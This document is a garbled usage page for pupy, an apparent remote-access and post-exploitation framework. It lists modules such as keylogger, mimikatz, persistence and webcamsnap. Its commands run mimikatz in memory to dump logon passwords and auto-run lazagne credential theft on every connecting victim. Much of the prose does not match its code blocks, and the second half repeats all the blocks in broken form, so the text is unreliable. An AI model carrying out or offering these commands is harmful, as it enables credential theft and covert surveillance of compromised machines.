## List commands and modules
To list all commands and aliases use the following command:
```code
>> help
```

For a complete list of modules, run:
```code
>> help -M
```

## Find commands and modules help
First of all it is important to know that nearly all commands in pupy have a help builtin. So if at any moment you are wondering what a command does you can type your command followed by `-h` or `--help`.
```code
>> sessions -h
>> jobs -h
>> run -h
```

For example if you want to know how to use the pyexec module type :
```code
>> run 
getsystem           load_package        msgbox              ps                  shell_exec          
download            interactive_shell   memory_exec         persistence         pyexec              shellcode_exec      
exit                keylogger           migrate             port_scan           pyshell             socks5proxy         
get_info            linux_pers          mimikatz            portfwd             screenshot          upload              
getprivs            linux_stealth       mouselogger         process_kill        search              webcamsnap          
>> load_package 
_sqlite3           linux_stealth      psutil             pupyimporter       pyshell            sqlite3            
interactive_shell  netcreds           ptyshell           pupymemexec        pywintypes27.dll   vidcap             
linux_pers         portscan           pupwinutils        pupyutils          scapy   
```

## Use the completion !
Nearly all commands and modules in pupy have custom auto-completion. So if you are wondering what you need to type just press TAB
```code
>> pyexec -
--code   --file   --help   -c       -h       
>> run pyexec --file /
/bin/         /etc/         /lib/         /libx32/      /media/       /proc/        /sbin/        /sys/         /var/         
/boot/        /home/        /lib32/       /live-build/  /mnt/         /root/        /share/       /tmp/         /vmlinuz      
/dev/         /initrd.img   /lib64/       /lost+found/  /opt/         /run/         /srv/         /usr/         
```


```code
>> shell_exec 'tasklist /V'
```

## Escape your arguments
Every command in pupy shell uses a unix-like escaping syntax. If you need a space in one of your arguments you need to put your argument between quotes.
```code
>> download 'C:\Windows\System32\cmd.exe'
```

If you send a Windows path, you need to double the backquotes or put everything between quotes.
```code
>> download C:\\Windows\\System32\\cmd.exe
```

or
```code
>> run --bg shell_exec 'tasklist /V'
[%] job < shell_exec ['tasklist /V'] > started in background !
```

## Create Aliases
Modules aliases can be defined in the `pupy.conf` file. If you define the following alias :
```code
>> run memory_exec /usr/share/mimikatz/Win32/mimikatz.exe privilege::debug sekurlsa::logonPasswords exit
```

As an example, defining the following alias will add a command to kill the pupy client's process with signal 9:
```code
>> sessions -i 1
```

## Jobs
Some modules like `socks5proxy` or `portfwd` automatically start as jobs, but all modules can be run as jobs when used with the `--bg` argument.
```code
>> sessions -i 'platform:Windows release:7'
```

The jobs output can be retrieved at any moment by using the `jobs -p` command. From the `jobs` command you can also list jobs status and kill jobs.
```
[on_connect]
any_1 = beroot
any_2 = lazagne
```

Regular jobs can be set in Linux/Unix environments by running your `pupysh.py` script inside the Screen utility. You can then setup cronjobs to run the below command at whatever intervals you require, this essentially pastes the input after the word 'stuff' into the screen session. Replace 1674 with the ID of your screen session, the echo command is the Enter key being pressed.
```
[on_connect]
* = include:default_commands

[default_commands]
any_1 = beroot
any_2 = lazagne
```

## Handle multiple clients connected
By default pupy launch every module you run on all connected clients. This allows for example to run mimikatz on all connected clients and dump passwords everywhere in one command
```
>> !ls
```

`code
>> help
`

`code
>> help -M
`

`code
>> sessions -h
>> jobs -h
>> run -h
`

`code
>> run 
getsystem           load_package        msgbox              ps                  shell_exec          
download            interactive_shell   memory_exec         persistence         pyexec              shellcode_exec      
exit                keylogger           migrate             port_scan           pyshell             socks5proxy         
get_info            linux_pers          mimikatz            portfwd             screenshot          upload              
getprivs            linux_stealth       mouselogger         process_kill        search              webcamsnap          
>> load_package 
_sqlite3           linux_stealth      psutil             pupyimporter       pyshell            sqlite3            
interactive_shell  netcreds           ptyshell           pupymemexec        pywintypes27.dll   vidcap             
linux_pers         portscan           pupwinutils        pupyutils          scapy   
`

`code
>> pyexec -
--code   --file   --help   -c       -h       
>> run pyexec --file /
/bin/         /etc/         /lib/         /libx32/      /media/       /proc/        /sbin/        /sys/         /var/         
/boot/        /home/        /lib32/       /live-build/  /mnt/         /root/        /share/       /tmp/         /vmlinuz      
/dev/         /initrd.img   /lib64/       /lost+found/  /opt/         /run/         /srv/         /usr/         
`

`code
>> shell_exec 'tasklist /V'
`

`code
>> download 'C:\Windows\System32\cmd.exe'
`

`code
>> download C:\\Windows\\System32\\cmd.exe
`

`code
>> run --bg shell_exec 'tasklist /V'
[%] job < shell_exec ['tasklist /V'] > started in background !
`

`code
>> run memory_exec /usr/share/mimikatz/Win32/mimikatz.exe privilege::debug sekurlsa::logonPasswords exit
`

`code
>> sessions -i 1
`

`code
>> sessions -i 'platform:Windows release:7'
`

`
[on_connect]
any_1 = beroot
any_2 = lazagne
`

`
[on_connect]
* = include:default_commands

[default_commands]
any_1 = beroot
any_2 = lazagne
`

`
>> !ls
`

